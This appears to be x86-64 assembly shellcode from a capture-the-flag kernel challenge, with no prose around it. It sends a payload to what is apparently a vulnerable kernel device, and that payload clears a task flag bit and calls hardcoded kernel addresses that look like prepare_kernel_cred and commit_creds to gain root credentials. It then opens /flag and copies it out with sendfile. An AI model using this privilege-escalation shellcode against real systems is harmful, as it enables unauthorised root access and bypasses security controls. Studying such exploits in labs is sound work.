mov eax, 1
lea rsi, [rip+kernel]
mov rdi, 3
mov rdx, 42
syscall
mov eax, 2
lea rdi, [rip+flag]
xor esi, esi
syscall
mov esi, eax
mov eax, 40
mov edi, 1
mov edx, 0
mov r10, 0x1000
syscall

kernel:
mov rax, qword ptr gs:0x15d00
and qword ptr [rax], 0xfffffffffffffeff
xor edi,edi
push rdx
mov rdx, 0xffffffff810890d0
call rdx
mov rdi, rax
mov rdx, 0xffffffff81088d90 
call rdx
pop rdx
ret 

bin_sh:
	.string "/bin/sh"
flag:
	.string "/flag"
